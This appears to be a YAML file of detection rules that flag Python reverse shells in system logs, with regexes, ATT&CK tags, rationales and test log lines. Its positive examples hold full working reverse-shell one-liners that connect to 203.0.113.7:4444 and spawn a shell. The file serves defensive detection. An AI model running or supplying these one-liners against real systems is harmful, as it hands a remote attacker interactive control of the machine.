- id: mention.revshell_python_socket_shell
  title: 'Python socket connect with dup2, pty.spawn or subprocess in one line'
  match:
    anchored: 'socket\.socket\([^\n]{0,120}\.connect\(\([^\n]{0,200}(?:dup2|pty\.spawn|subprocess\.(?:call|Popen|run|check_output)\()'
  case_sensitive: false
  strength: strong
  attack: [T1059.006, T1095]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    A one-line Python program that opens a socket, connects it and then duplicates descriptors onto it or spawns a
    shell is the Python reverse shell. Normal Python clients connect and send data; they do not dup2 the socket onto
    stdin/stdout.
  examples:
    positive:
      - 'Nov 20 10:12:00 web01 bash[5130]: HISTORY: python3 -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("203.0.113.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'''
      - 'Nov 20 10:12:01 web01 bash[5131]: HISTORY: python3 -c ''import os,pty,socket;s=socket.socket();s.connect(("203.0.113.7",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'''
    negative:
      - 'Nov 20 10:12:02 web01 app[700]: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((host, 443)); s.sendall(payload)'
      - 'Nov 20 10:12:03 web01 bash[5132]: HISTORY: python3 -c "import socket; print(socket.gethostname())"'

- id: mention.revshell_python_dup2_fileno
  title: Python dup2 of an object's descriptor onto stdin, stdout or stderr
  match:
    anchored: 'dup2\( {0,2}[A-Za-z_]{1,16}\.fileno\(\) {0,2}, {0,2}[0-2] {0,2}\)'
  case_sensitive: true
  strength: medium
  attack: [T1059.006]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    'os.dup2(s.fileno(),0)' rewires the standard streams onto another object, almost always a socket in reverse
    shells. Daemonizing code redirects streams onto /dev/null the same way, so on its own this is medium.
  examples:
    positive:
      - 'Nov 20 10:13:00 web01 bash[5133]: HISTORY: python -c "...;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1)"'
    negative:
      - 'Nov 20 10:13:01 web01 app[700]: os.dup2(devnull.fileno(), sys.stdout.fileno())'
      - 'Nov 20 10:13:02 web01 app[700]: os.dup2(fd, 1)'

